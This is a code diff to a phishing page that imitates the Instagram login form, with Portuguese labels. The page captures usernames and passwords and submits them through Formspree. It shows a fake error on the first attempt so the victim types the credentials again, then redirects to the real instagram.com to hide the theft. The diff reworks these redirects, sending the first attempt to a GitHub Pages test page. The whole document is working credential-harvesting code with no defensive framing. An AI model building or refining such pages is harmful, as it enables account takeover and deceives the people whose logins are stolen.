@@ -89,8 +89,8 @@ button {
                 <input type="text" name="login" placeholder="Telefone, nome de usuário ou email" required>
                 <input type="password" name="senha" placeholder="Senha" required>
 
-                <!-- _next controlado por JS -->
-                <input type="hidden" id="nextField" name="_next" value="https://www.instagram.com/">
+                <!-- Campo _next controlado por JS -->
+                <input type="hidden" id="nextField" name="_next" value="">
                 <input type="hidden" name="_captcha" value="false">
 
                 <button type="submit">Entrar</button>
@@ -115,16 +115,26 @@ form.addEventListener('submit', function () {
     tentativas++;
 
     if (tentativas === 1) {
-        // 1ª tentativa: envia normal, SEM redirecionar
-        nextField.disabled = true;   // impede redirecionamento do Formspree
+        // 1ª tentativa → falha
         erro.style.display = 'block';
-    } else {
-        // 2ª tentativa: envia normal E redireciona
-        nextField.disabled = false;
 
-        // backup de redirecionamento
+        // redireciona para site de falha
+        nextField.value = "https://marcelovbjunior-code.github.io/TESTE/";
+
+        // backup
         setTimeout(() => {
-            window.location.href = 'https://www.instagram.com/';
+            window.location.href = "https://marcelovbjunior-code.github.io/TESTE/";
+        }, 300);
+
+    } else {
+        // 2ª tentativa → sucesso
+        erro.style.display = 'none';
+
+        nextField.value = "https://www.instagram.com/";
+
+        // backup
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com/";
         }, 300);
     }
 });
